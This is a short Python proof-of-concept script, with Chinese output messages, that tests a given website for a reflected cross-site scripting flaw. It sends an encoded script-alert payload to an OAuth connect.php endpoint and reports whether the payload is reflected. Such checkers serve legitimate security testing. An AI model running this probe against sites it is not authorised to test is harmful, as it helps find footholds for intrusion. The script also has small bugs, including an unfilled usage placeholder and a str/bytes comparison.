# -*- coding: utf-8 -*- 



import sys 
import urllib3 


if len(sys.argv) < 2:
    print("Usage:\npython %s target(Start with http:// or https://)")
    exit(0) 
    
    
target = sys.argv[1]
if not target.startswith("http"):
    print("Usage:\npython %s target(Start with http:// or https://)")
    exit(0) 
    
exp_url = target+"/data/api/oauth/connect.php?method=xxx%3Cscript%3Ealert(1)%3C/script%3E" 

http = urllib3.PoolManager()

resp = http.request("GET", exp_url)

if not resp.status == 200:
    print("请求失败，请检查路径。响应状态码: %d" % resp.status )

if "xxx<script>alert(1)</script>" in resp.data:
    print("执行完成！漏洞利用URL:\n%s" % exp_url)
    exit(0)

print("执行完成，不存在漏洞。")
